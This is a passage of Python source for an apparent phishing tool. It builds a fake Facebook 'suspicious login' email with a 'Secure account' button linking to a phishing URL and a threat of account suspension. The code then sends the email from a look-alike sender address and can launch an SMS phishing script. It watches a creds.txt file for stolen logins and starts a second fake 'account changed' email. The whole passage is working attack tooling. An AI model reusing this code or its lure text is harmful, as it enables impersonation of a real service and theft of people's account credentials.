(!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n              <!--[if (mso)|(IE)]></td><td align="center" width="320" style=" width:320px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num8" style="display: table-cell;vertical-align: top;min-width: 320px;max-width: 320px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px;text-align: center"><span style="font-size: 42px; line-height: 50px;"><strong><span style="line-height: 50px; font-size: 42px;">Facebook</span></strong></span></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n									 <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><span style="font-size: 16px; line-height: 19px;">﻿Hello """+full_name+""", We've found some suspicious activity on your account, We think someone logged in to your Facebook Profile with this details:</span>﻿</p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#9F7474;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#9F7474;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>OS:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;"""+Email_OS+"""</strong><br></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>Time:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; """+Email_time+"""</strong></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>From:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160; &#160; """+Email_from+"""</strong></p><p style="margin: 0;font-size: 12px;line-height: 14px"><strong>IP:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; """+Email_ip+"""</strong></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 10px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 14px;line-height: 17px"><span style="font-size: 14px; line-height: 16px;">if this is you please <a style="color:#0068A5;text-decoration: underline;" title="confirm" href="CONFIRM_URL">confirm</a> here, or if this isn't you just secure your account by changing your password and clicking the button down below<br></span></p><p style="margin: 0;font-size: 14px;line-height: 17px">or we will have to suspend your facebook account <br></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="480" style=" width:480px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num12" style="min-width: 320px;max-width: 480px;display: table-cell;vertical-align: top;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n                  \n                    \n<div align="center" class="button-container center" style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;">\n  <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0" style="border-spacing: 0; border-collapse: collapse; mso-table-lspace:0pt; mso-table-rspace:0pt;"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top:10px; padding-bottom:10px;" align="center"><v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word" href="""+phishin_url+""" style="height:31pt; v-text-anchor:middle; width:124pt;" arcsize="10%" strokecolor="#0068A5" fillcolor="#0068A5"><w:anchorlock/><v:textbox inset="0,0,0,0"><center style="color:#ffffff; font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; font-size:16px;"><![endif]-->\n    <a href="""+phishin_url+""" target="_blank" style="display: block;text-decoration: none;-webkit-text-size-adjust: none;text-align: center;color: #ffffff; background-color: #0068A5; border-radius: 4px; -webkit-border-radius: 4px; -moz-border-radius: 4px; max-width: 166px; width: 126px;width: auto; border-top: 0px solid transparent; border-right: 0px solid transparent; border-bottom: 0px solid transparent; border-left: 0px solid transparent; padding-top: 5px; padding-right: 20px; padding-bottom: 5px; padding-left: 20px; font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;mso-border-alt: none">\n      <span style="font-size:16px;line-height:32px;"><strong>Secure account</strong></span>\n    </a>\n  <!--[if mso]></center></v:textbox></v:roundrect></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>   <!--[if (mso)|(IE)]></td></tr></table><![endif]-->\n		</td>\n  </tr>\n  </tbody>\n  </table>\n  <!--[if (mso)|(IE)]></div><![endif]-->\n</body></html>""")
	from_email = str(random.choice(['security@facebookmails.com','no-reply@facebookmails.com']))

	subprocess.call(['sendemail', '-f', from_email,'-t', str(Email), '-u', 'Log in', '-m', email_body_html, '-s', smtps+":"+port, '-xu', username, '-xp', password])

	os.system("reset")

	display.stop()

	if Phone_try == "N":
		pass
	elif Phone_try == "y":
		os.system("xterm -e \"python3 ./sms_support/facebook_sms.py\" &")

	##################################
	#       CHECKING FOR CREDS       #
	##################################

	os.system("reset")

	banN()
	print("             \033[0;37m################################################")
	print("             #  \033[0mListening for Creds on ID:\033[0;94m"+str(ID)+"\033[0;37m   #")
	print("             ################################################\033[0;93m")
	print("             "+Grey+"[\033[0;34m*"+Grey+"]-["+Reset+"EXTRA-URL"+Grey+"]"+Reset+": \033[0;34m"+phishin_url+"\033[0;93m\n")

	os.system("tail -f ./WEBSERVER/creds.txt")

	print("\n                 \033[0;34m######################################")
	print("                 #              --DONE--              #")
	print("                 ######################################")

	os.system("pkill -9 ngrok")
	os.system("pkill -9 php")

	print("                             one last step!!\n")

	IPZ=input(Grey+"["+Blue+"IP"+Grey+"]"+Green+": "+Reset)
	OSZ=input(Grey+"["+Blue+"OS"+Grey+"]"+Green+": "+Reset)

	email_changed_body_html=("""<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional //EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><head>\n    <!--[if gte mso 9]><xml>\n     <o:OfficeDocumentSettings>\n      <o:AllowPNG/>\n      <o:PixelsPerInch>96</o:PixelsPerInch>\n     </o:OfficeDocumentSettings>\n    </xml><![endif]-->\n    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">\n    <meta name="viewport" content="width=device-width">\n    <!--[if !mso]><!--><meta http-equiv="X-UA-Compatible" content="IE=edge"><!--<![endif]-->\n    <title></title>\n    \n    \n    <style type="text/css" id="media-query">\n      body {\n  margin: 0;\n  padding: 0; }\n\ntable, tr, td {\n  vertical-align: top;\n  border-collapse: collapse; }\n\n.ie-browser table, .mso-container table {\n  table-layout: fixed; }\n\n* {\n  line-height: inherit; }\n\na[x-apple-data-detectors=true] {\n  color: inherit !important;\n  text-decoration: none !important; }\n\n[owa] .img-container div, [owa] .img-container button {\n  display: block !important; }\n\n[owa] .fullwidth button {\n  width: 100% !important; }\n\n[owa] .block-grid .col {\n  display: table-cell;\n  float: none !important;\n  vertical-align: top; }\n\n.ie-browser .num12, .ie-browser .block-grid, [owa] .num12, [owa] .block-grid {\n  width: 480px !important; }\n\n.ExternalClass, .ExternalClass p, .ExternalClass span, .ExternalClass font, .ExternalClass td, .ExternalClass div {\n  line-height: 100%; }\n\n.ie-browser .mixed-two-up .num4, [owa] .mixed-two-up .num4 {\n  width: 160px !important; }\n\n.ie-browser .mixed-two-up .num8, [owa] .mixed-two-up .num8 {\n  width: 320px !important; }\n\n.ie-browser .block-grid.two-up .col, [owa] .block-grid.two-up .col {\n  width: 240px !important; }\n\n.ie-browser .block-grid.three-up .col, [owa] .block-grid.three-up .col {\n  width: 160px !important; }\n\n.ie-browser .block-grid.four-up .col, [owa] .block-grid.four-up .col {\n  width: 120px !important; }\n\n.ie-browser .block-grid.five-up .col, [owa] .block-grid.five-up .col {\n  width: 96px !important; }\n\n.ie-browser .block-grid.six-up .col, [owa] .block-grid.six-up .col {\n  width: 80px !important; }\n\n.ie-browser .block-grid.seven-up .col, [owa] .block-grid.seven-up .col {\n  width: 68px !important; }\n\n.ie-browser .block-grid.eight-up .col, [owa] .block-grid.eight-up .col {\n  width: 60px !important; }\n\n.ie-browser .block-grid.nine-up .col, [owa] .block-grid.nine-up .col {\n  width: 53px !important; }\n\n.ie-browser .block-grid.ten-up .col, [owa] .block-grid.ten-up .col {\n  width: 48px !important; }\n\n.ie-browser .block-grid.eleven-up .col, [owa] .block-grid.eleven-up .col {\n  width: 43px !important; }\n\n.ie-browser .block-grid.twelve-up .col, [owa] .block-grid.twelve-up .col {\n  width: 40px !important; }\n@media only screen and (min-width: 500px) {"""+"""\n  .block-grid {\n    width: 480px !important; }\n  .block-grid .col {\n    vertical-align: top; }\n    .block-grid .col.num12 {\n      width: 480px !important; }\n  .block-grid.mixed-two-up .col.num4 {\n    width: 160px !important; }\n  .block-grid.mixed-two-up .col.num8 {\n    width: 320px !important; }\n  .block-grid.two-up .col {\n    width: 240px !important; }\n  .block-grid.three-up .col {\n    width: 160px !important; }\n  .block-grid.four-up .col {\n    width: 120px !important; }\n  .block-grid.five-up .col {\n    width: 96px !important; }\n  .block-grid.six-up .col {\n    width: 80px !important; }\n  .block-grid.seven-up .col {\n    width: 68px !important; }\n  .block-grid.eight-up .col {\n    width: 60px !important; }\n  .block-grid.nine-up .col {\n    width: 53px !important; }\n  .block-grid.ten-up .col {\n    width: 48px !important; }\n  .block-grid.eleven-up .col {\n    width: 43px !important; }\n  .block-grid.twelve-up .col {\n    width: 40px !important; } }\n@media (max-width: 500px) {\n  .block-grid, .col {\n    min-width: 320px !important;\n    max-width: 100% !important;\n    display: block !important; }\n  .block-grid {\n    width: calc(100% - 40px) !important; }\n  .col {\n    width: 100% !important; }\n    .col > div {\n      margin: 0 auto; }\n  img.fullwidth, img.fullwidthOnMobile {\n    max-width: 100% !important; }\n  .no-stack .col {\n    min-width: 0 !important;\n    display: table-cell !important; }\n  .no-stack.two-up .col {\n    width: 50% !important; }\n  .no-stack.mixed-two-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.mixed-two-up .col.num8 {\n    width: 66% !important; }\n  .no-stack.three-up .col.num4 {\n    width: 33% !important; }\n  .no-stack.four-up .col.num3 {\n    width: 25% !important; } }\n\n    </style>\n</head>\n<body class="clean-body" style="margin: 0;padding: 0;-webkit-text-size-adjust: 100%;background-color: #FAF7F7">\n  <style type="text/css" id="media-query-bodytag">\n    @media (max-width: 520px) {\n      .block-grid {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n      .col {\n        min-width: 320px!important;\n        max-width: 100%!important;\n        width: 100%!important;\n        display: block!important;\n      }\n        .col > div {\n          margin: 0 auto;\n        }\n      img.fullwidth {\n        max-width: 100%!important;\n      }\n			img.fullwidthOnMobile {\n        max-width: 100%!important;\n      }\n      .no-stack .col {\n				min-width: 0!important;\n				display: table-cell!important;\n			}\n			.no-stack.two-up .col {\n				width: 50%!important;\n			}\n			.no-stack.mixed-two-up .col.num4 {\n				width: 33%!important;\n			}\n			.no-stack.mixed-two-up .col.num8 {\n				width: 66%!important;\n			}\n			.no-stack.three-up .col.num4 {\n				width: 33%!important\n			}\n			.no-stack.four-up .col.num3 {\n				width: 25%!important\n			}\n    }\n  </style>\n  <!--[if IE]><div class="ie-browser"><![endif]-->\n  <!--[if mso]><div class="mso-container"><![endif]-->\n  <table class="nl-container" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 320px;Margin: 0 auto;background-color: #FAF7F7;width: 100%" cellpadding="0" cellspacing="0">\n	<tbody>\n	<tr style="vertical-align: top">\n		<td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top">\n    <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td align="center" style="background-color: #FAF7F7;"><![endif]-->\n    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid mixed-two-up ">\n        <div style="border-collapse: collapse;display: table;width: 100%;background-color:transparent;">\n          <!--[if (mso)|(IE)]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="background-color:transparent;" align="center"><table cellpadding="0" cellspacing="0" border="0" style="width: 480px;"><tr class="layout-full-width" style="background-color:transparent;"><![endif]-->\n              <!--[if (mso)|(IE)]><td align="center" width="160" style=" width:160px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num4" style="display: table-cell;vertical-align: top;max-width: 320px;min-width: 160px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n                  \n                    <div align="center" class="img-container center fixedwidth" style="padding-right: 0px;  padding-left: 0px;">\n<!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 0px; padding-left: 0px;" align="center"><![endif]-->\n  <img class="center fixedwidth" align="center" border="0" src="https://proxy.duckduckgo.com/iu/?u=http://pngimg.com/uploads/facebook_logos/facebook_logos_PNG19748.png&f=1" alt="Image" title="Image" style="outline: none;text-decoration: none;-ms-interpolation-mode: bicubic;clear: both;display: block !important;border: 0;height: auto;float: none;width: 100%;max-width: 80px" width="80">\n<!--[if mso]></td></tr></table><![endif]-->\n</div>\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n              <!--[if (mso)|(IE)]></td><td align="center" width="320" style=" width:320px; padding-right: 0px; padding-left: 0px; padding-top:5px; padding-bottom:5px; border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent;" valign="top"><![endif]-->\n            <div class="col num8" style="display: table-cell;vertical-align: top;min-width: 320px;max-width: 320px;">\n              <div style="background-color: transparent; width: 100% !important;">\n              <!--[if (!mso)&(!IE)]><!--><div style="border-top: 0px solid transparent; border-left: 0px solid transparent; border-bottom: 0px solid transparent; border-right: 0px solid transparent; padding-top:5px; padding-bottom:5px; padding-right: 0px; padding-left: 0px;"><!--<![endif]-->\n\n                  \n                    <!--[if mso]><table width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td style="padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;"><![endif]-->\n<div style="color:#0068A5;line-height:120%;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif; padding-right: 10px; padding-left: 10px; padding-top: 20px; padding-bottom: 10px;">	\n	<div style="font-size:12px;line-height:14px;color:#0068A5;font-family:Arial, 'Helvetica Neue', Helvetica, sans-serif;text-align:left;"><p style="margin: 0;font-size: 12px;line-height: 14px;text-align: center"><span style="font-size: 42px; line-height: 50px;"><strong><span style="line-height: 50px; font-size: 42px;">Facebook</span></strong></span></p></div>	\n</div>\n<!--[if mso]></td></tr></table><![endif]-->\n\n                  \n                  \n                    <table border="0" cellpadding="0" cellspacing="0" width="100%" class="divider" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;min-width: 100%;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n    <tbody>\n        <tr style="vertical-align: top">\n            <td class="divider_inner" style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;padding-right: 10px;padding-left: 10px;padding-top: 10px;padding-bottom: 10px;min-width: 100%;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n									 <table class="divider_content" align="center" border="0" cellpadding="0" cellspacing="0" width="100%" style="border-collapse: collapse;table-layout: fixed;border-spacing: 0;mso-table-lspace: 0pt;mso-table-rspace: 0pt;vertical-align: top;border-top: 1px solid #BBBBBB;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                    <tbody>\n                        <tr style="vertical-align: top">\n                            <td style="word-break: break-word;border-collapse: collapse !important;vertical-align: top;mso-line-height-rule: exactly;-ms-text-size-adjust: 100%;-webkit-text-size-adjust: 100%">\n                                <span></span>\n                            </td>\n                        </tr>\n                    </tbody>\n                </table>\n            </td>\n        </tr>\n    </tbody>\n</table>\n                  \n              <!--[if (!mso)&(!IE)]><!--></div><!--<![endif]-->\n              </div>\n            </div>\n          <!--[if (mso)|(IE)]></td></tr></table></td></tr></table><![endif]-->\n        </div>\n      </div>\n    </div>    <div style="background-color:transparent;">\n      <div style="Margin: 0 auto;min-width: 320px;max-width: 480px;overflow-wrap: break-word;word-wrap: break-word;word-break: break-word;background-color: transparent;" class="block-grid 